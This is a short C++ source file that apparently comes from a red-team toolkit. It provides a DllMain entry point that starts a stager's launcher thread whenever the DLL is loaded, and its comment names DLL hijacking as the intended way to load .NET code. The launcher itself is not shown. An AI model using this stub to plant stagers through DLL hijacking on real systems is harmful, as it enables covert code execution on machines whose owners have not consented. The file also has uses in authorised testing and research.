// dllmain.cpp : Defines the entry point for the DLL application.
/*
	Author: The Wover
	Description: Provides a DllMain entry point so that our stager can execute when the DLL is loaded by a process.
		Lets you load your .NET code through any normal DLL Hijacking or similar technique.
*/
#define WIN32_LEAN_AND_MEAN
#include "native.h"


extern "C" BOOL APIENTRY DllMain(HMODULE h, DWORD reasonForCall, void* resv)
{
	if (reasonForCall == DLL_PROCESS_ATTACH)
	{
		//Create a new thread from our proxy native function to avoid Loader Lock
		CreateThread(0, 0, launcher, h, 0, 0);
	}
	return TRUE;
}